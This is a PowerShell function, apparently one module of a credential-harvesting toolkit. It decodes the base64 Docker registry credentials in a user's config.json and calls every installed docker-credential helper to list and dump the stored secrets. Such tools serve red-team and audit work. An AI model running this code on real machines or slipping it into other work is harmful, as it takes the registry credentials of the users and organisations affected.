function Invoke-MultiPassDocker {
    $docker = New-Object MultiPassExport
    $docker.category = "DevOps"
    $docker.software = "docker"
    $configPath = "$($env:USERPROFILE)\.docker\config.json"
    if (Test-Path $configPath){
        $docker.data["path:config.json"] = "$configPath"
        $config = Get-Content -Raw -Path $configPath | ConvertFrom-Json
        if( $null -ne $config.auths ){
            $jAuths = $config.auths| ConvertTo-Json | ConvertFrom-Json
            foreach($url in $jAuths.psobject.properties.name){
                $b64Cred = "not on config.json"
                if ($null -ne $jAuths.$url.auth){
                    $b64Cred = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($jAuths.$url.auth))
                }
                $docker.data["creds:url:$url"] = "$b64Cred"
            }
        }
        if( $null -ne $config.credsStore ){
            $docker.data["credStore"] = "$config.credsStore"
        }
    }
    # Get all docker.exe installed
    $dock = Get-Command -all docker.exe
    foreach($command in $dock){
        # For each docker we found, list all credential helpers
        $dpath = Split-Path -Path $command.source
        $docker.data["path:docker"] = $dpath;
        $dcreds = Get-ChildItem -Path $dpath\docker-credential-*.exe;
        foreach($dcred in $dcreds){
            # For each helper, list all credentials
            $tmpcred = & $dcred.Name list;
            $jsonCred = ConvertFrom-Json -InputObject $tmpcred
            # and for each credentials, dump them
            foreach($url in $jsonCred.psobject.properties.name)
            {
                $out = Write-Output $url | & $dcred.Name get;
                $key = "credStore:url:" +$url+":"+$dcred.Name
                $docker.data[$key] = "$out"
            }
        }
    }    
    return $docker
}